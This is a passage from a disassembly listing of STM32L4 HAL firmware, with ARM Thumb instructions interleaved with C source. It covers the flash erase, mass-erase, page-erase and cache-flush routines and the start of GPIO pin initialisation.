 800193a:	3b01      	subs	r3, #1
 800193c:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 800193e:	7ffb      	ldrb	r3, [r7, #31]
 8001940:	2b00      	cmp	r3, #0
 8001942:	d1ef      	bne.n	8001924 <FLASH_Program_Fast+0x30>
 8001944:	693b      	ldr	r3, [r7, #16]
 8001946:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 8001948:	68bb      	ldr	r3, [r7, #8]
 800194a:	f383 8810 	msr	PRIMASK, r3
}
 800194e:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 8001950:	bf00      	nop
 8001952:	3724      	adds	r7, #36	; 0x24
 8001954:	46bd      	mov	sp, r7
 8001956:	f85d 7b04 	ldr.w	r7, [sp], #4
 800195a:	4770      	bx	lr
 800195c:	40022000 	.word	0x40022000

08001960 <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 8001960:	b580      	push	{r7, lr}
 8001962:	b084      	sub	sp, #16
 8001964:	af00      	add	r7, sp, #0
 8001966:	6078      	str	r0, [r7, #4]
 8001968:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 800196a:	4b48      	ldr	r3, [pc, #288]	; (8001a8c <HAL_FLASHEx_Erase+0x12c>)
 800196c:	781b      	ldrb	r3, [r3, #0]
 800196e:	2b01      	cmp	r3, #1
 8001970:	d101      	bne.n	8001976 <HAL_FLASHEx_Erase+0x16>
 8001972:	2302      	movs	r3, #2
 8001974:	e085      	b.n	8001a82 <HAL_FLASHEx_Erase+0x122>
 8001976:	4b45      	ldr	r3, [pc, #276]	; (8001a8c <HAL_FLASHEx_Erase+0x12c>)
 8001978:	2201      	movs	r2, #1
 800197a:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800197c:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001980:	f7ff ff3a 	bl	80017f8 <FLASH_WaitForLastOperation>
 8001984:	4603      	mov	r3, r0
 8001986:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 8001988:	7bfb      	ldrb	r3, [r7, #15]
 800198a:	2b00      	cmp	r3, #0
 800198c:	d175      	bne.n	8001a7a <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 800198e:	4b3f      	ldr	r3, [pc, #252]	; (8001a8c <HAL_FLASHEx_Erase+0x12c>)
 8001990:	2200      	movs	r2, #0
 8001992:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 8001994:	4b3e      	ldr	r3, [pc, #248]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 8001996:	681b      	ldr	r3, [r3, #0]
 8001998:	f403 7300 	and.w	r3, r3, #512	; 0x200
 800199c:	2b00      	cmp	r3, #0
 800199e:	d013      	beq.n	80019c8 <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80019a0:	4b3b      	ldr	r3, [pc, #236]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 80019a2:	681b      	ldr	r3, [r3, #0]
 80019a4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80019a8:	2b00      	cmp	r3, #0
 80019aa:	d009      	beq.n	80019c0 <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
 80019ac:	4b38      	ldr	r3, [pc, #224]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 80019ae:	681b      	ldr	r3, [r3, #0]
 80019b0:	4a37      	ldr	r2, [pc, #220]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 80019b2:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80019b6:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
 80019b8:	4b34      	ldr	r3, [pc, #208]	; (8001a8c <HAL_FLASHEx_Erase+0x12c>)
 80019ba:	2203      	movs	r2, #3
 80019bc:	771a      	strb	r2, [r3, #28]
 80019be:	e016      	b.n	80019ee <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 80019c0:	4b32      	ldr	r3, [pc, #200]	; (8001a8c <HAL_FLASHEx_Erase+0x12c>)
 80019c2:	2201      	movs	r2, #1
 80019c4:	771a      	strb	r2, [r3, #28]
 80019c6:	e012      	b.n	80019ee <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 80019c8:	4b31      	ldr	r3, [pc, #196]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 80019ca:	681b      	ldr	r3, [r3, #0]
 80019cc:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80019d0:	2b00      	cmp	r3, #0
 80019d2:	d009      	beq.n	80019e8 <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 80019d4:	4b2e      	ldr	r3, [pc, #184]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 80019d6:	681b      	ldr	r3, [r3, #0]
 80019d8:	4a2d      	ldr	r2, [pc, #180]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 80019da:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80019de:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 80019e0:	4b2a      	ldr	r3, [pc, #168]	; (8001a8c <HAL_FLASHEx_Erase+0x12c>)
 80019e2:	2202      	movs	r2, #2
 80019e4:	771a      	strb	r2, [r3, #28]
 80019e6:	e002      	b.n	80019ee <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80019e8:	4b28      	ldr	r3, [pc, #160]	; (8001a8c <HAL_FLASHEx_Erase+0x12c>)
 80019ea:	2200      	movs	r2, #0
 80019ec:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 80019ee:	687b      	ldr	r3, [r7, #4]
 80019f0:	681b      	ldr	r3, [r3, #0]
 80019f2:	2b01      	cmp	r3, #1
 80019f4:	d111      	bne.n	8001a1a <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 80019f6:	687b      	ldr	r3, [r7, #4]
 80019f8:	685b      	ldr	r3, [r3, #4]
 80019fa:	4618      	mov	r0, r3
 80019fc:	f000 f84a 	bl	8001a94 <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001a00:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001a04:	f7ff fef8 	bl	80017f8 <FLASH_WaitForLastOperation>
 8001a08:	4603      	mov	r3, r0
 8001a0a:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 8001a0c:	4b20      	ldr	r3, [pc, #128]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 8001a0e:	695b      	ldr	r3, [r3, #20]
 8001a10:	4a1f      	ldr	r2, [pc, #124]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 8001a12:	f023 0304 	bic.w	r3, r3, #4
 8001a16:	6153      	str	r3, [r2, #20]
 8001a18:	e02d      	b.n	8001a76 <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 8001a1a:	683b      	ldr	r3, [r7, #0]
 8001a1c:	f04f 32ff 	mov.w	r2, #4294967295
 8001a20:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 8001a22:	687b      	ldr	r3, [r7, #4]
 8001a24:	689b      	ldr	r3, [r3, #8]
 8001a26:	60bb      	str	r3, [r7, #8]
 8001a28:	e01d      	b.n	8001a66 <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 8001a2a:	687b      	ldr	r3, [r7, #4]
 8001a2c:	685b      	ldr	r3, [r3, #4]
 8001a2e:	4619      	mov	r1, r3
 8001a30:	68b8      	ldr	r0, [r7, #8]
 8001a32:	f000 f84d 	bl	8001ad0 <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001a36:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001a3a:	f7ff fedd 	bl	80017f8 <FLASH_WaitForLastOperation>
 8001a3e:	4603      	mov	r3, r0
 8001a40:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 8001a42:	4b13      	ldr	r3, [pc, #76]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 8001a44:	695b      	ldr	r3, [r3, #20]
 8001a46:	4a12      	ldr	r2, [pc, #72]	; (8001a90 <HAL_FLASHEx_Erase+0x130>)
 8001a48:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 8001a4c:	f023 0302 	bic.w	r3, r3, #2
 8001a50:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 8001a52:	7bfb      	ldrb	r3, [r7, #15]
 8001a54:	2b00      	cmp	r3, #0
 8001a56:	d003      	beq.n	8001a60 <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 8001a58:	683b      	ldr	r3, [r7, #0]
 8001a5a:	68ba      	ldr	r2, [r7, #8]
 8001a5c:	601a      	str	r2, [r3, #0]
          break;
 8001a5e:	e00a      	b.n	8001a76 <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 8001a60:	68bb      	ldr	r3, [r7, #8]
 8001a62:	3301      	adds	r3, #1
 8001a64:	60bb      	str	r3, [r7, #8]
 8001a66:	687b      	ldr	r3, [r7, #4]
 8001a68:	689a      	ldr	r2, [r3, #8]
 8001a6a:	687b      	ldr	r3, [r7, #4]
 8001a6c:	68db      	ldr	r3, [r3, #12]
 8001a6e:	4413      	add	r3, r2
 8001a70:	68ba      	ldr	r2, [r7, #8]
 8001a72:	429a      	cmp	r2, r3
 8001a74:	d3d9      	bcc.n	8001a2a <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 8001a76:	f000 f84f 	bl	8001b18 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 8001a7a:	4b04      	ldr	r3, [pc, #16]	; (8001a8c <HAL_FLASHEx_Erase+0x12c>)
 8001a7c:	2200      	movs	r2, #0
 8001a7e:	701a      	strb	r2, [r3, #0]

  return status;
 8001a80:	7bfb      	ldrb	r3, [r7, #15]
}
 8001a82:	4618      	mov	r0, r3
 8001a84:	3710      	adds	r7, #16
 8001a86:	46bd      	mov	sp, r7
 8001a88:	bd80      	pop	{r7, pc}
 8001a8a:	bf00      	nop
 8001a8c:	2000000c 	.word	0x2000000c
 8001a90:	40022000 	.word	0x40022000

08001a94 <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 8001a94:	b480      	push	{r7}
 8001a96:	b083      	sub	sp, #12
 8001a98:	af00      	add	r7, sp, #0
 8001a9a:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 8001a9c:	687b      	ldr	r3, [r7, #4]
 8001a9e:	f003 0301 	and.w	r3, r3, #1
 8001aa2:	2b00      	cmp	r3, #0
 8001aa4:	d005      	beq.n	8001ab2 <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 8001aa6:	4b09      	ldr	r3, [pc, #36]	; (8001acc <FLASH_MassErase+0x38>)
 8001aa8:	695b      	ldr	r3, [r3, #20]
 8001aaa:	4a08      	ldr	r2, [pc, #32]	; (8001acc <FLASH_MassErase+0x38>)
 8001aac:	f043 0304 	orr.w	r3, r3, #4
 8001ab0:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001ab2:	4b06      	ldr	r3, [pc, #24]	; (8001acc <FLASH_MassErase+0x38>)
 8001ab4:	695b      	ldr	r3, [r3, #20]
 8001ab6:	4a05      	ldr	r2, [pc, #20]	; (8001acc <FLASH_MassErase+0x38>)
 8001ab8:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001abc:	6153      	str	r3, [r2, #20]
}
 8001abe:	bf00      	nop
 8001ac0:	370c      	adds	r7, #12
 8001ac2:	46bd      	mov	sp, r7
 8001ac4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001ac8:	4770      	bx	lr
 8001aca:	bf00      	nop
 8001acc:	40022000 	.word	0x40022000

08001ad0 <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 8001ad0:	b480      	push	{r7}
 8001ad2:	b083      	sub	sp, #12
 8001ad4:	af00      	add	r7, sp, #0
 8001ad6:	6078      	str	r0, [r7, #4]
 8001ad8:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 8001ada:	4b0e      	ldr	r3, [pc, #56]	; (8001b14 <FLASH_PageErase+0x44>)
 8001adc:	695b      	ldr	r3, [r3, #20]
 8001ade:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 8001ae2:	687b      	ldr	r3, [r7, #4]
 8001ae4:	00db      	lsls	r3, r3, #3
 8001ae6:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 8001aea:	490a      	ldr	r1, [pc, #40]	; (8001b14 <FLASH_PageErase+0x44>)
 8001aec:	4313      	orrs	r3, r2
 8001aee:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 8001af0:	4b08      	ldr	r3, [pc, #32]	; (8001b14 <FLASH_PageErase+0x44>)
 8001af2:	695b      	ldr	r3, [r3, #20]
 8001af4:	4a07      	ldr	r2, [pc, #28]	; (8001b14 <FLASH_PageErase+0x44>)
 8001af6:	f043 0302 	orr.w	r3, r3, #2
 8001afa:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001afc:	4b05      	ldr	r3, [pc, #20]	; (8001b14 <FLASH_PageErase+0x44>)
 8001afe:	695b      	ldr	r3, [r3, #20]
 8001b00:	4a04      	ldr	r2, [pc, #16]	; (8001b14 <FLASH_PageErase+0x44>)
 8001b02:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001b06:	6153      	str	r3, [r2, #20]
}
 8001b08:	bf00      	nop
 8001b0a:	370c      	adds	r7, #12
 8001b0c:	46bd      	mov	sp, r7
 8001b0e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001b12:	4770      	bx	lr
 8001b14:	40022000 	.word	0x40022000

08001b18 <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 8001b18:	b480      	push	{r7}
 8001b1a:	b083      	sub	sp, #12
 8001b1c:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 8001b1e:	4b21      	ldr	r3, [pc, #132]	; (8001ba4 <FLASH_FlushCaches+0x8c>)
 8001b20:	7f1b      	ldrb	r3, [r3, #28]
 8001b22:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 8001b24:	79fb      	ldrb	r3, [r7, #7]
 8001b26:	2b01      	cmp	r3, #1
 8001b28:	d002      	beq.n	8001b30 <FLASH_FlushCaches+0x18>
 8001b2a:	79fb      	ldrb	r3, [r7, #7]
 8001b2c:	2b03      	cmp	r3, #3
 8001b2e:	d117      	bne.n	8001b60 <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 8001b30:	4b1d      	ldr	r3, [pc, #116]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b32:	681b      	ldr	r3, [r3, #0]
 8001b34:	4a1c      	ldr	r2, [pc, #112]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b36:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 8001b3a:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 8001b3c:	4b1a      	ldr	r3, [pc, #104]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b3e:	681b      	ldr	r3, [r3, #0]
 8001b40:	4a19      	ldr	r2, [pc, #100]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b42:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 8001b46:	6013      	str	r3, [r2, #0]
 8001b48:	4b17      	ldr	r3, [pc, #92]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b4a:	681b      	ldr	r3, [r3, #0]
 8001b4c:	4a16      	ldr	r2, [pc, #88]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b4e:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 8001b52:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 8001b54:	4b14      	ldr	r3, [pc, #80]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b56:	681b      	ldr	r3, [r3, #0]
 8001b58:	4a13      	ldr	r2, [pc, #76]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b5a:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8001b5e:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 8001b60:	79fb      	ldrb	r3, [r7, #7]
 8001b62:	2b02      	cmp	r3, #2
 8001b64:	d002      	beq.n	8001b6c <FLASH_FlushCaches+0x54>
 8001b66:	79fb      	ldrb	r3, [r7, #7]
 8001b68:	2b03      	cmp	r3, #3
 8001b6a:	d111      	bne.n	8001b90 <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 8001b6c:	4b0e      	ldr	r3, [pc, #56]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b6e:	681b      	ldr	r3, [r3, #0]
 8001b70:	4a0d      	ldr	r2, [pc, #52]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b72:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8001b76:	6013      	str	r3, [r2, #0]
 8001b78:	4b0b      	ldr	r3, [pc, #44]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b7a:	681b      	ldr	r3, [r3, #0]
 8001b7c:	4a0a      	ldr	r2, [pc, #40]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b7e:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 8001b82:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 8001b84:	4b08      	ldr	r3, [pc, #32]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b86:	681b      	ldr	r3, [r3, #0]
 8001b88:	4a07      	ldr	r2, [pc, #28]	; (8001ba8 <FLASH_FlushCaches+0x90>)
 8001b8a:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8001b8e:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001b90:	4b04      	ldr	r3, [pc, #16]	; (8001ba4 <FLASH_FlushCaches+0x8c>)
 8001b92:	2200      	movs	r2, #0
 8001b94:	771a      	strb	r2, [r3, #28]
}
 8001b96:	bf00      	nop
 8001b98:	370c      	adds	r7, #12
 8001b9a:	46bd      	mov	sp, r7
 8001b9c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001ba0:	4770      	bx	lr
 8001ba2:	bf00      	nop
 8001ba4:	2000000c 	.word	0x2000000c
 8001ba8:	40022000 	.word	0x40022000

08001bac <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 8001bac:	b480      	push	{r7}
 8001bae:	b087      	sub	sp, #28
 8001bb0:	af00      	add	r7, sp, #0
 8001bb2:	6078      	str	r0, [r7, #4]
 8001bb4:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 8001bb6:	2300      	movs	r3, #0
 8001bb8:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001bba:	e148      	b.n	8001e4e <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 8001bbc:	683b      	ldr	r3, [r7, #0]
 8001bbe:	681a      	ldr	r2, [r3, #0]
 8001bc0:	2101      	movs	r1, #1
 8001bc2:	697b      	ldr	r3, [r7, #20]
 8001bc4:	fa01 f303 	lsl.w	r3, r1, r3
 8001bc8:	4013      	ands	r3, r2
 8001bca:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 8001bcc:	68fb      	ldr	r3, [r7, #12]
 8001bce:	2b00      	cmp	r3, #0
 8001bd0:	f000 813a 	beq.w	8001e48 <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 8001bd4:	683b      	ldr	r3, [r7, #0]
 8001bd6:	685b      	ldr	r3, [r3, #4]
 8001bd8:	f003 0303 	and.w	r3, r3, #3
 8001bdc:	2b01      	cmp	r3, #1
 8001bde:	d005      	beq.n	8001bec <HAL_GPIO_Init+0x40>
 8001be0:	683b      	ldr	r3, [r7, #0]
 8001be2:	685b      	ldr	r3, [r3, #4]
 8001be4:	f003 0303 	and.w	r3, r3, #3
 8001be8:	2b02      	cmp	r3, #2
 8001bea:	d130      	bne.n	8001c4e <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 8001bec:	687b      	ldr	r3, [r7, #4]
 8001bee:	689b      	ldr	r3, [r3, #8]
 8001bf0:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 8001bf2:	697b      	ldr	r3, [r7, #20]
 8001bf4:	005b      	lsls	r3, r3, #1
 8001bf6:	2203      	movs	r2, #3
 8001bf8:	fa02 f303 	lsl.w	r3, r2, r3
 8001bfc:	43db      	mvns	r3, r3
 8001bfe:	693a      	ldr	r2, [r7, #16]
 8001c00:	4013      	ands	r3, r2
 8001c02:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 8001c04:	683b      	ldr	r3, [r7, #0]
 8001c06:	68da      	ldr	r2, [r3, #12]
 8001c08:	697b      	ldr	r3, [r7, #20]
 8001c0a:	005b      	lsls	r3, r3, #1
 8001c0c:	fa02 f303 	lsl.w	r3, r2, r3
 8001c10:	693a      	ldr	r2, [r7, #16]
 8001c12:	4313      	orrs	r3, r2
 8001c14:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 8001c16:	687b      	ldr	r3, [r7, #4]
 8001c18:	693a      	ldr	r2, [r7, #16]
 8001c1a:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 8001c1c:	687b      	ldr	r3, [r7, #4]
 8001c1e:	685b      	ldr	r3, [r3, #4]
 8001c20:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 8001c22:	2201      	movs	r2, #1
 8001c24:	697b      	ldr	r3, [r7, #20]
 8001c26:	fa02 f303 	lsl.w	r3, r2, r3
 8001c2a:	43db      	mvns	r3, r3
 8001c2c:	693a      	ldr	r2, [r7, #16]
 8001c2e:	4013      	ands	r3, r2
 8001c30:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 8001c32:	683b      	ldr	r3, [r7, #0]
 8001c34:	685b      	ldr	r3, [r3, #4]
 8001c36:	091b      	lsrs	r3, r3, #4
 8001c38:	f003 0201 	and.w	r2, r3, #1
 8001c3c:	697b      	ldr	r3, [r7, #20]
 8001c3e:	fa02 f303 	lsl.w	r3, r2, r3
 8001c42:	693a      	ldr	r2, [r7, #16]
 8001c44:	4313      	orrs	r3, r2
 8001c46:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 8001c48:	687b      	ldr	r3, [r7, #4]
 8001c4a:	693a      	ldr	r2, [r7, #16]
 8001c4c:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 8001c4e:	683b      	ldr	r3, [r7, #0]
 8001c50:	685b      	ldr	r3, [r3, #4]
 8001c52:	f003 0303 	and.w	r3, r3, #3
 8001c56:	2b03      	cmp	r3, #3
 8001c58:	d017      	beq.n	8001c8a <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 8001c5a:	687b      	ldr	r3, [r7, #4]
 8001c5c:	68db      	ldr	r3, [r3, #12]
 8001c5e:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 8001c60:	697b      	ldr	r3, [r7, #20]
 8001c62:	005b      	lsls	r3, r3, #1
 8001c64:	2203      	movs	r2, #3
 8001c66:	fa02 f303 	lsl.w	r3, r2, r3
 8001c6a:	43db      	mvns	r3, r3
 8001c6c:	693a      	ldr	r2, [r7, #16]
 8001c6e:	4013      	ands	r3, r2
 8001c70:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 8001c72:	683b      	ldr	r3, [r7, #0]
 8001c74:	689a      	ldr	r2, [r3, #8]
 8001c76:	697b      	ldr	r3, [r7, #20]
 8001c78:	005b      	lsls	r3, r3, #1
 8001c7a:	fa02 f303 	lsl.w	r3, r2, r3
 8001c7e:	693a      	ldr	r2, [r7, #16]
 8001c80:	4313      	orrs	r3, r2
 8001c82:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 8001c84:	687b      	ldr	r3, [r7, #4]
 8001c86:	693a      	ldr	r2, [r7, #16]
 8001c88:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 8001c8a:	683b      	ldr	r3, [r7, #0]
 8001c8c:	685b      	ldr	r3, [r3, #4]
 8001c8e:	f003 0303 	and.w	r3, r3, #3
 8001c92:	2b02      	cmp	r3, #2
 8001c94:	d123      	bne.n	8001cde <HAL_GPIO_Init+0x132>
